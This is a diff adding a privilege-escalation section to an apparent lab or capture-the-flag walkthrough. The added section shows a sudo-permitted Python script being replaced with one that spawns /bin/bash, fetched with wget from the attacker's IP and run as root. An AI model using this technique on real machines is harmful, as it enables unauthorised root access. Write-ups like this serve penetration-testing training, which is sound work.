@@ -124,6 +124,8 @@ Sudo -l Enumeration:
 
 ### Local enumeration
 
+Linpeas:
+
 ```
 /etc/mysql/mariadb.cnf
 
@@ -134,4 +136,39 @@ Found /etc/aliases.db: Berkeley DB (Hash, version 9, native byte-order)
 
 ### PrivEsc vector
 
+<mark style="color:yellow;">sudo /usr/bin/python /home/walter/wifi\_reset.py</mark>
+
+Remove wifi\_reset.py:
+
+{% code overflow="wrap" %}
+```
+rm -f /home/walter/wifi_reset.py
+```
+{% endcode %}
+
+Replace with wifi\_reset.py:
+
+```
+import os
+
+os.system('/bin/bash')
+```
+
+Transfer to Victim:
+
+```
+cd /home/walter
+
+wget 192.168.49.66/wifi_reset.py
+```
+
+Execute Binary:
+
+```
+sudo /usr/bin/python /home/walter/wifi_reset.py
+```
+
 ## Proofs
+
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption><p>Root</p></figcaption></figure>
+
